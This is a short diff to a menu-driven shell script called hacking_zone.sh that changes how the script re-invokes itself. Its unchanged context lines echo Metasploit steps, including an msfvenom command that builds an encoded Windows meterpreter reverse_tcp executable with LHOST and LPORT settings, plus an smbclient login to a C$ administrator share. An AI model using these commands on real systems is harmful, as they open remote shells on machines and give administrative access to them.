@@ -110,7 +110,7 @@ fi
 			echo "Step17: set LHOST <ip_addr>"
 			echo "Step 18: set LPORT 443"
 			echo "exploit"
-			sh hacking_zone.sh
+			./hacking_zone.sh
 			;;
 
 	4)
@@ -124,7 +124,7 @@ fi
 			echo "---------------------------------------------"
 			echo "             Download Completed"
 			echo "---------------------------------------------"
-			sh hacking_zone.sh
+			./hacking_zone.sh
 			;;
 	5)
 			echo "Enter the link of Video: \c"
@@ -133,7 +133,7 @@ fi
 			echo "---------------------------------------------"
 			echo "             Download Completed"
 			echo "---------------------------------------------"
-			sh hacking_zone.sh
+			./hacking_zone.sh
 			;;
 	6)
 			#echo "Enter text to convert into Binary: \c"
@@ -141,7 +141,7 @@ fi
 			cd && cd Timepass/Binary-cnvrtr && python3 binary-convrtr.py
 			sleep 5s
 			cd
-			sh hacking_zone.sh
+			./hacking_zone.sh
 			;;
 	7)
 			echo "msfvenom -l payloads"
@@ -150,10 +150,10 @@ fi
 			echo "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 200 -f exe > name2.exe"
 			echo "smbclient //<ip_addr>/c$ -U=administrator"
 			echo "You can continue ahead"
-			sh hacking_zone.sh
+			./hacking_zone.sh
 			;;
 	*)
 			ehco "It seems you entered wrong input..."
-			sh hacking_zone.sh
+			./hacking_zone.sh
 			;;
 		esac
